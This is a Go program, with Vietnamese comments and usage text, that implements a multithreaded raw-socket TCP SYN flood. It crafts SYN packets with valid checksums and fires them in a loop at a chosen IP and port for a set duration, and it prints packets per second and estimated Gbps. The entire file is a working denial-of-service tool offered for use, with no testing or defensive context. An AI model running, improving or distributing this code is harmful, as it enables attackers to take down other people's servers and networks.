package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	PacketSize       = 40 // IP 20 + TCP 20
	PseudoHeaderSize = 12
)

var (
	pps        uint64
	targetIP   net.IP
	targetPort uint16
	stop       chan struct{}
	wg         sync.WaitGroup
)

type PseudoHeader struct {
	SrcAddr [4]byte
	DstAddr [4]byte
	Zero    byte
	Proto   byte
	Length  uint16
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return uint16(^sum)
}

func buildSYNPacket(srcIP net.IP, srcPort uint16, dstIP net.IP, dstPort uint16) []byte {
	packet := make([]byte, PacketSize)

	// IP Header (20 bytes)
	packet[0] = 0x45                               // Version 4, IHL 5
	binary.BigEndian.PutUint16(packet[2:4], PacketSize)
	binary.BigEndian.PutUint16(packet[4:6], uint16(rand.Intn(65535))) // IP ID random
	packet[8] = 64                                 // TTL 64
	packet[9] = syscall.IPPROTO_TCP
	copy(packet[12:16], srcIP.To4())
	copy(packet[16:20], dstIP.To4())

	// TCP Header (offset 20)
	binary.BigEndian.PutUint16(packet[20:22], srcPort)
	binary.BigEndian.PutUint16(packet[22:24], dstPort)
	binary.BigEndian.PutUint32(packet[24:28], rand.Uint32()) // Seq random
	// Ack = 0 (SYN)
	packet[32] = 5 << 4                                    // Data offset 5
	packet[33] = 0x02                                      // Flags: SYN = 1
	binary.BigEndian.PutUint16(packet[34:36], 65535)       // Window max
	// Checksum = 0 tạm
	// Urgent = 0

	// IP checksum
	ipHdr := packet[:20]
	binary.BigEndian.PutUint16(ipHdr[10:12], checksum(ipHdr))

	// TCP checksum (pseudo + tcp)
	var ph PseudoHeader
	copy(ph.SrcAddr[:], srcIP.To4())
	copy(ph.DstAddr[:], dstIP.To4())
	ph.Proto = syscall.IPPROTO_TCP
	ph.Length = 20

	pseudo := make([]byte, PseudoHeaderSize+20)
	copy(pseudo[:PseudoHeaderSize], (*[PseudoHeaderSize]byte)(unsafe.Pointer(&ph))[:])
	copy(pseudo[PseudoHeaderSize:], packet[20:])

	tcpChecksum := checksum(pseudo)
	binary.BigEndian.PutUint16(packet[36:38], tcpChecksum)

	return packet
}

func floodWorker() {
	defer wg.Done()

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Fprintf(os.Stderr, "socket failed: %v\n", err)
		return
	}
	defer syscall.Close(fd)

	// Bắt buộc IP_HDRINCL
	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)

	sin := syscall.SockaddrInet4{Port: int(targetPort)}
	copy(sin.Addr[:], targetIP.To4())

	var localPPS int
	for {
		select {
		case <-stop:
			return
		default:
		}

		// Source IP thật (không spoof) → provider cho phép
		srcIP := getOutboundIP() // hoặc fix nếu cần
		srcPort := uint16(1024 + rand.Intn(64511)) // tránh port <1024

		pkt := buildSYNPacket(srcIP, srcPort, targetIP, targetPort)

		syscall.Sendto(fd, pkt, 0, &sin)

		atomic.AddUint64(&pps, 1)
		localPPS++
		if localPPS%10000 == 0 { // giảm overhead
			time.Sleep(1 * time.Microsecond) // tránh CPU 100% quá nhanh
		}
	}
}

// Lấy IP outbound thật (không spoof)
func getOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return net.IPv4(127, 0, 0, 1) // fallback
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.To4()
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "Usage: %s <target_ip> <port> <threads> <seconds>\n", os.Args[0])
		fmt.Println("Ví dụ: sudo ./synflood 1.2.3.4 80 200 300")
		os.Exit(1)
	}

	targetStr := os.Args[1]
	targetPort = uint16(atoi(os.Args[2]))
	threads := atoi(os.Args[3])
	duration := atoi(os.Args[4])

	targetIP = net.ParseIP(targetStr)
	if targetIP == nil {
		fmt.Println("IP không hợp lệ")
		os.Exit(1)
	}

	rand.Seed(time.Now().UnixNano())
	stop = make(chan struct{})

	fmt.Printf("SYN Flood → %s:%d | Threads: %d | Thời gian: %ds | Chạy với sudo!\n", targetStr, targetPort, threads, duration)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go floodWorker()
	}

	// Monitor PPS
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				cur := atomic.SwapUint64(&pps, 0) / 2 // PPS trung bình
				gbps := float64(cur) * 40 * 8 / 1_000_000_000
				fmt.Printf("[+] PPS: %d ≈ %.2f Gbps\n", cur, gbps)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	wg.Wait()

	fmt.Println("Done.")
}

func atoi(s string) int {
	i, _ := strconv.Atoi(s)
	return i
}